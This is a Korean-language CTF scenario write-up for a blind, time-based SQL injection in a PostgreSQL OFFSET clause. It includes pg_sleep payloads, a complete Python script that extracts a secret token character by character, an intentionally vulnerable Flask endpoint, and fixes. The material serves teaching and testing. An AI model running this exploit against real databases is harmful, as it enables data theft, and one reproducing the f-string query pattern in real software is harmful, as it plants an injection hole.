---
title: SQL Injection in LIMIT / OFFSET Clause — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, sql-injection, limit-injection, offset-injection, blind-sqli, database-security]
confidence: high
---

# SQL Injection in LIMIT / OFFSET Clause — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Paged Document Archive (페이징 문서 보관소)
- **난이도**: High
- **핵심 컨셉**: 일반적인 SQL 구문의 `WHERE` 절이나 `INSERT` 문이 아닌, 문법적 제약이 매우 강력한 **LIMIT 또는 OFFSET 절** 내에서 발생하는 **고급 SQL 인젝션** 문제입니다. 웹 서비스는 대량의 문서 목록을 끊어 보여주기 위해 페이지 크기(`limit`) 및 시작 위치(`offset`) 매개변수를 수집합니다. 정수형 변환이 누락된 채 쿼리에 문자열 형태로 결합되어 인젝션 틈새가 발생합니다. 공격자는 이 자리에 일반적인 `UNION`이나 `OR` 구문을 삽입할 수 없음을 인지하고, DBMS별 특수 연산 기능(PostgreSQL의 서명 없는 서브쿼리 문법 또는 MySQL의 `PROCEDURE ANALYSE`)을 조합해 시간차(Time-based) 방식으로 다른 민감한 테이블 내부 정보를 복원해 냅니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Pagination Console**: 문서 목록 하단의 "이전/다음" 및 "페이지 번호" 링크를 클릭해 데이터 세트를 수신하는 콘솔.
- **Backend Service (Python with PostgreSQL)**:
  - 데이터 페이징 API `/api/documents?limit=10&offset=[OFFSET]` 제공.
  - 실행 쿼리:
    `SELECT id, title, content FROM docs LIMIT 10 OFFSET [OFFSET_VALUE]`
- **Flag 위치**: 
  - `admin_flags` 테이블 내부의 `secret_token` 데이터.

### 2.2 취약점 지점
1. **Dynamic Offset Value Concatenation**:
   - 백엔드는 클라이언트로부터 입력받은 `offset` 파라미터가 정수형(`int`)인지 자료형 타입 캐스팅 검증을 생략하고 쿼리 끝에 포맷팅 결합을 수행합니다.
   - SQL 구조상 `LIMIT` 또는 `OFFSET` 절 뒤에는 `UNION` 지시어가 위치할 수 없어 일반적인 테이블 데이터 결합 조회가 막히지만, PostgreSQL 등에서는 수식 계산 자리에 서브쿼리를 대입할 수 있는 문법적 유연성을 이용해 데이터 침투가 가능합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 / 파라미터 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|---------------------|--------|------|---------|---------|------|
| `/api/documents?offset=0`| GET | 없음 | `offset` 페이징 변수 | 문서 목록 JSON 배열 | `offset` 위치에 SQLi 발생 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 문법 및 DBMS 판별
페이징 파라미터 뒤에 산술 연산 수식을 주입해 계산이 먹히는지 확인하여 쿼리 유형 및 DBMS를 추정합니다.
- *정상 요청*: `/api/documents?offset=0` (정상 작동)
- *산술 요청*: `/api/documents?offset=5-5` (정상 작동 - offset 0과 동일)
- *PostgreSQL 특화 구문 확인*: `/api/documents?offset=(SELECT 0)` (정상 작동 확인 - PostgreSQL 계열로 판단)

### Step 2. LIMIT/OFFSET 절 내 서브쿼리 연산 설계 (Time-based)
PostgreSQL 문법 상 `OFFSET (서브쿼리)` 패턴이 허용되므로, 이 서브쿼리 내에 조건식(`CASE WHEN`)과 시간 지연 함수(`pg_sleep`)를 조합합니다.
- **기본 공격 페이로드**:
  `OFFSET (SELECT CASE WHEN (조건식) THEN (SELECT 5 FROM pg_sleep(5)) ELSE 0 END)`
  - 만약 조건식이 참(True)이면 `pg_sleep(5)`가 기동되어 응답이 5초 늦게 오고, 거짓(False)이면 즉각(0ms) 응답을 반환합니다.

### Step 3. 오토 인젝션 브루트포스 스크립트 실행
공격자는 `admin_flags` 테이블의 `secret_token` 컬럼 1바이트씩 덤프하기 위해 스크립트를 빌드합니다.
- **Exploit Script (Python)**:
  ```python
  import requests
  import time

  url = "http://archive.challenge.local/api/documents"
  flag = ""
  
  for pos in range(1, 40):
      for char_code in range(32, 127):
          # admin_flags 테이블에서 토큰 글자를 한 바이트씩 ascii 코드로 떼내어 비교
          sqli = f"(SELECT CASE WHEN (ascii(substr((SELECT secret_token FROM admin_flags LIMIT 1),{pos},1))={char_code}) THEN (SELECT 3 FROM pg_sleep(3)) ELSE 0 END)"
          
          start = time.time()
          try:
              # offset 파라미터에 쿼리 주입
              requests.get(url, params={"limit": 10, "offset": sqli}, timeout=6)
          except requests.exceptions.ReadTimeout:
              flag += chr(char_code)
              print(f"[*] Flag found so far: {flag}")
              break
              
          duration = time.time() - start
          if duration >= 2.5:
              flag += chr(char_code)
              print(f"[*] Flag found so far: {flag}")
              break
  ```

### Step 4. flag 획득
스크립트 가동 결과 3초의 응답 지연 구간이 매치되는 아스키 문자 값들이 순차 복원되며, 최종 어드민 플래그 문자열(`FLAG{sqli_in_offset_clause_postgres_bypass}`)을 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python Flask with PostgreSQL)

```python
# app.py
from flask import Flask, request, jsonify
import psycopg2

app = Flask(__name__)

def get_db_connection():
    return psycopg2.connect("host=localhost dbname=paged_db user=postgres password=pass")

@app.route("/api/documents", methods=["GET"])
def get_documents():
    limit_val = request.args.get("limit", "10")
    offset_val = request.args.get("offset", "0")
    
    # 취약점 지점: offset_val을 정수(int)로 강제 캐스팅하지 않고 
    # 포맷 스트링 방식으로 SQL 쿼리 본문에 직접 기입
    # 이로 인해 LIMIT 10 OFFSET (SELECT ...) 같은 구문 변조 성립
    query = f"SELECT id, title, content FROM docs LIMIT {limit_val} OFFSET {offset_val}"
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    try:
        cursor.execute(query)
        rows = cursor.fetchall()
        
        results = []
        for row in rows:
            results.append({"id": row[0], "title": row[1], "content": row[2]})
        return jsonify(results)
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        cursor.close()
        conn.close()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **엄격한 데이터 타입 강제 변환 (Type Casting)**:
   - 클라이언트에서 들어오는 페이징용 매개변수 값은 쿼리에 붙이기 전 반드시 백엔드 소스 레벨에서 `int()` 혹은 `parseInt()` 처리를 수행하여 숫자가 아닌 정적 텍스트 및 특수 쿼리 기호가 섞여 유입되는 것을 물리적으로 거절해야 합니다.
   - **올바른 수정 예시**:
     ```python
     # 안전하게 정수형 캐스팅 적용 및 기본값 방어
     try:
         limit_val = int(request.args.get("limit", 10))
         offset_val = int(request.args.get("offset", 0))
     except ValueError:
         return jsonify({"error": "Invalid pagination inputs"}), 400
         
     # 이후 쿼리 실행
     query = "SELECT id, title, content FROM docs LIMIT %s OFFSET %s"
     cursor.execute(query, (limit_val, offset_val))
     ```
2. **매개변수화 바인딩 컴파일**:
   - `LIMIT` 및 `OFFSET` 자리에 플레이스홀더를 기입하고 바인딩 인자로 파라미터를 인계해 주어 인젝션의 발생 가능성을 원천 제거합니다.
